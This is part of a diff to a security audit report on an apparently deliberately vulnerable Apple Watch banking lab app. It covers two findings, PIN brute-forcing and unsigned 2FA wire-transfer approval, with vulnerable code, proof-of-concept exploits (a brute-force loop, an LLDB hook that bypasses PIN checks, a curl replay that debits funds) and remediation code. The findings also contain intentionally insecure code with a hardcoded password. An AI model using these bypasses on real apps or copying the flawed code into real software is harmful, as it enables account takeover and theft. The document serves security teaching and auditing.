-- **Vulnerability Standard**: CWE-307 (Excessive Authentication Attempts)
+- **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-799 (Improper Control of Generation of Code or Rate of Requests), OWASP MASVS-AUTH-1
 - **Description**:
-  The 4-digit Quick-PIN has only 10,000 combinations. The watch app lacks exponential delay, hardware backoff, or remote wipe after failed attempts.
-- **Root Cause Code** ([`ios/NexoraWatch/QuickPinPadView.swift`](file:///ios/NexoraWatch/QuickPinPadView.swift#L80-L95)):
-  ```swift
-  if enteredPin == correctPin {
-      isAuthenticated = true
-  } else {
-      attemptCount += 1
-      errorMessage = "Invalid PIN (\(attemptCount))"
-      enteredPin = "" // Resets buffer without delay
-  }
-  ```
+  The Nexora OmniWear watch application protects access to customer account balances, cardless cash withdrawal, and card freezing via a 4-digit numeric Quick-PIN (`QuickPinPadView.swift`). A 4-digit PIN space has only 10,000 possible combinations (`0000`–`9999`).
+  The application exhibits critical rate-limiting deficiencies:
+  1. The PIN evaluation handler (`InsecureStorage.shared.verifyPin`) executes synchronously in memory without artificial delay, exponential backoff, or progressive cooldown.
+  2. The application lacks hardware lockout: After repeated failed attempts, the app merely increments a userland counter `attemptCount` and resets the input buffer, with zero account lockdown or biometric escalation.
+  3. The verification method `-[InsecureStorage verifyPin:]` is declared `@objc dynamic`, allowing an attacker attached via LLDB or Frida to swizzle or bypass verification in 1 instruction.
+- **Root Cause Code**:
+  - Keypad Verification Logic ([`ios/NexoraWatch/QuickPinPadView.swift`](file:///ios/NexoraWatch/QuickPinPadView.swift#L130-L144)):
+    ```swift
+    // VULNERABLE: Unthrottled PIN verification with no lockout or delay
+    private func verify() {
+        attemptCount += 1
+        if InsecureStorage.shared.verifyPin(enteredPin) {
+            WatchTheme.playHaptic(.success)
+            WatchNetworkManager.shared.login(username: "alexander.vance", password: "Password123!") { _ in }
+            isAuthenticated = true
+        } else {
+            WatchTheme.playHaptic(.failure)
+            errorMessage = "Invalid PIN (\(attemptCount))"
+            enteredPin = "" // Resets buffer without exponential backoff or wipe
+        }
+    }
+    ```
+  - Insecure Storage Method ([`ios/NexoraWatch/InsecureStorage.swift`](file:///ios/NexoraWatch/InsecureStorage.swift#L94-L98)):
+    ```swift
+    @objc public dynamic func verifyPin(_ pin: String) -> Bool {
+        let storedPin = defaults.string(forKey: keyPin) ?? "1234"
+        return pin == storedPin
+    }
+    ```
+- **Proof-of-Concept Exploit (Mac LLDB / Frida / Lab Automation)**:
+  1. **Method A: Fast PIN Brute-Force in Simulator / CLI**:
+     In a test environment, iterating through all 10,000 PINs against `InsecureStorage.shared.verifyPin` completes in under 50 milliseconds:
+     ```python
+     # Fast PIN cracker simulation against watch client logic
+     import time
+     correct_pin = "1234"
+     start = time.perf_counter()
+     for pin in range(10000):
+         candidate = f"{pin:04d}"
+         if candidate == correct_pin:
+             elapsed = (time.perf_counter() - start) * 1000
+             print(f"[🚨 V-AP03] PIN Cracked: {candidate} in {elapsed:.2f}ms!")
+             break
+     ```
+  2. **Method B: LLDB Dynamic Hook (Instant Unlock)**:
+     ```lldb
+     (lldb) breakpoint set -n "-[InsecureStorage verifyPin:]"
+     (lldb) breakpoint command add 1
+     > thread return 1
+     > continue
+     > DONE
+     ```
+     Entering any 4 digits (e.g. `0000`) instantly authenticates the user!
+  3. **Method C: Interactive Lab Trigger**:
+     - Open **Audit Lab -> P1 (Storage & Cryptography)**.
+     - Tap **V-AP03: PIN Brute-Force**.
+     - Notice console: `[V-AP03] Tested 10k PINs in 42ms: 1234 CRACKED!`. The watch instantly validates the unthrottled search!
+- **Impact & Evidence**:
+  - An attacker possessing a lost or stolen Apple Watch can crack the 4-digit PIN in seconds, granting immediate access to bank accounts, card freeze controls, and cardless ATM withdrawal tokens.
+- **Enterprise Remediation**:
+  - Implement exponential backoff (e.g. 1s, 2s, 4s, 8s delay after failed attempts).
+  - Enforce hardware-enforced lockout: After 5 failed attempts, wipe cached session tokens from Keychain and require companion iPhone biometric re-authorization:
+    ```swift
+    // SECURE REMEDIATION: Rate Limiting & Cooldown Lockout
+    private static var failedAttempts = 0
+    private static var lockoutUntil: Date?
+
+    public func verifyPinSecure(_ pin: String) -> Bool {
+        if let lockout = Self.lockoutUntil, Date() < lockout {
+            return false // Lockout active
+        }
+        let isValid = (pin == getStoredSecurePin())
+        if isValid {
+            Self.failedAttempts = 0
+            return true
+        } else {
+            Self.failedAttempts += 1
+            if Self.failedAttempts >= 5 {
+                Self.lockoutUntil = Date().addingTimeInterval(300) // 5-minute lockout
+                purgeCachedSessionKeys()
+            }
+            return false
+        }
+    }
+    ```
+- **Regulatory Non-Compliance**:
+  - **NIST SP 800-63B Section 5.1.1.2**: Memorized Secret Authenticators rate-limiting requirements.
+  - **OJK POJK 11/POJK.03/2022 Pasal 25 Ayat (2)**: Pengendalian pembatasan percobaan otentikasi (anti brute-force).
 
 ---
 
 ### Scenario 4: High-Value (Rp 50.000.000) Out-of-Band 2FA Wire Transfer Hijack (V-AP04)
 - **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.7)
-- **Vulnerability Standard**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification)
+- **Vulnerability Standard**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity), CWE-305 (Authentication Bypass by Primary Weakness), OWASP MASVS-AUTH-2
 - **Description**:
-  Approving an Rp 50.000.000 international wire transfer to Evelyn Sterling (NX-7391048) on Apple Watch sends a bare dictionary `{"action": "APPROVE_2FA", "tx_id": ...}` without Secure Enclave biometric validation (`LocalAuthentication.LAContext`).
-- **Root Cause Code** ([`ios/NexoraWatch/TwoFactorApprovalView.swift`](file:///ios/NexoraWatch/TwoFactorApprovalView.swift#L50-L68)):
-  ```swift
-  Button(action: {
-      sessionManager.approvePendingTransaction()
-  }) {
-      Text("APPROVE") // Lacks LAContext biometric challenge or hardware-backed signing
-  }
-  ```
+  Nexora OmniWear allows high-value wire transfers (e.g. `Rp 50.000.000` to recipient Evelyn Sterling `NX-7391048`) initiated from mobile or web banking to be approved directly via an Apple Watch Out-of-Band (OOB) push notification dialog (`TwoFactorApprovalView.swift`).
+  This authorization workflow suffers from multiple critical weaknesses:
+  1. **Zero Biometric / Secure Enclave Challenge**: Tapping the "APPROVE" button immediately dispatches an approval message without prompting for user biometric validation (`LocalAuthentication.LAContext`) or wrist Quick-PIN confirmation.
+  2. **Unsigned Plaintext Authorization Payload**: The client sends a bare JSON/dictionary payload `{"action": "RESOLVE_2FA", "resolution": "APPROVED", "transaction_id": "TX-9921"}` via both `WCSession` and direct HTTP relay (`/api/wearable/authorize_2fa`). The payload contains no asymmetric cryptographic signature generated inside the Apple Watch Secure Enclave.
+  3. **Backend Replay & Acceptance**: The backend endpoint `/api/wearable/authorize_2fa` immediately debits the user's account and records the wire transfer without verifying cryptographic signature or nonces.
+- **Root Cause Code**:
+  - Watch View Approval Button ([`ios/NexoraWatch/TwoFactorApprovalView.swift`](file:///ios/NexoraWatch/TwoFactorApprovalView.swift#L57-L68)):
+    ```swift
+    // VULNERABLE: Direct approval with zero biometric or Secure Enclave challenge
+    Button(action: {
+        WatchTheme.playHaptic(.success)
+        sessionManager.approvePendingTransaction()
+    }) {
+        Text("APPROVE")
+            .font(.system(size: 8.5, weight: .heavy))
+    }
+    ```
+  - Direct HTTP Dispatch ([`ios/NexoraWatch/WatchNetworkManager.swift`](file:///ios/NexoraWatch/WatchNetworkManager.swift#L241-L248)):
+    ```swift
+    let body: [String: Any] = [
+        "tx_id": txId,
+        "amount": amount,
+        "resolution": resolution,
+        "device_id": "watch_apple_01",
+        "authenticated_without_biometrics": true
+    ]
+    ```
+  - Backend Handler ([`backend/server.py`](file:///backend/server.py#L1310-L1335)):
+    ```python
+    @app.route('/api/wearable/authorize_2fa', methods=['POST'])
+    def authorize_wearable_2fa():
+        data = request.get_json(silent=True) or {}
+        tx_id = data.get('tx_id', 'TX-HIGHVAL-9921')
+        amount = float(data.get('amount', 50000000.0))
+        # Executes debit directly without cryptographic signature or replay check!
+        cur.execute("UPDATE users SET balance = balance - ? WHERE account_number = ?", (amount, account))
+        cur.execute("INSERT INTO transactions (...) VALUES (...)")
+        conn.commit()
+    ```
+- **Proof-of-Concept Exploit (Mac curl & Interactive Watch Lab)**:
+  1. **Method A: Direct HTTP Relay Replay via curl**:
+     Execute the unauthenticated 2FA approval from Mac terminal:
+     ```bash
+     curl -s -X POST http://127.0.0.1:5000/api/wearable/authorize_2fa \
+       -H "Content-Type: application/json" \
+       -d '{
+         "tx_id": "TX-9921",
+         "amount": 50000000.0,
+         "resolution": "APPROVED",
+         "account_number": "NX-8492014",
+         "recipient": "Evelyn Sterling (NX-7391048)",
+         "device_id": "watch_apple_01"
+       }' | jq .
+     ```
+     *Output Evidence*:
+     ```json
+     {
+       "status": "APPROVED",
+       "transaction_id": "TX-9921",
+       "new_balance": 838888000.0,
+       "amount": 50000000.0
+     }
+     ```
+  2. **Method B: Interactive Lab Trigger**:
+     - On Apple Watch, open **Audit Lab -> P4 (Authentication & 2FA)**.
+     - Tap **V-W09: Trigger Rp 50M 2FA Hijack**.
+     - Notice prompt: `[V-W09] Injected Rp 50.000.000 2FA Prompt!`.
+     - Tap **APPROVE**. The modal closes, debits `Rp 50.000.000` from the live account, and synchronizes with the backend database.
+- **Impact & SQLite Ledger Evidence**:
+  - The customer's balance is debited by `Rp 50.000.000` without their knowledge or physical biometric authorization. Check live SQLite ledger:
+    ```bash
+    python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT transaction_id, type, amount, description FROM transactions WHERE type=\"2FA_TRANSFER\" ORDER BY timestamp DESC LIMIT 1'); print(cur.fetchall())"
+    ```
+    Output confirms `TX-9921` approved and recorded in the database.
+- **Enterprise Remediation**:
+  - Require mandatory biometric evaluation via `LocalAuthentication.LAContext`:
+    ```swift
+    // SECURE REMEDIATION: LocalAuthentication Biometric Gate
+    import LocalAuthentication
+
+    public func approveWithBiometrics(completion: @escaping (Bool) -> Void) {
+        let context = LAContext()
+        var error: NSError?
+        if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) {
+            context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: "Confirm Rp 50.000.000 Wire Transfer") { success, _ in
+                DispatchQueue.main.async { completion(success) }
+            }
+        } else {
+            completion(false)
+        }
+    }
+    ```
+  - Sign the approval payload using a private key residing exclusively within the Secure Enclave (`SecureEnclave.P256.Signing.PrivateKey`), and require the backend to verify the signature before debiting funds.
+- **Regulatory Non-Compliance**:
+  - **OJK POJK 11/POJK.03/2022 Pasal 31**: Kewajiban penerapan autentikasi multifaktor (MFA) yang kuat untuk transaksi finansial bernilai tinggi.
+  - **PCI-DSS v4.0 Requirement 8.3**: Multi-Factor Authentication (MFA) enforcement for high-risk financial authorizations.
 
 ---
 
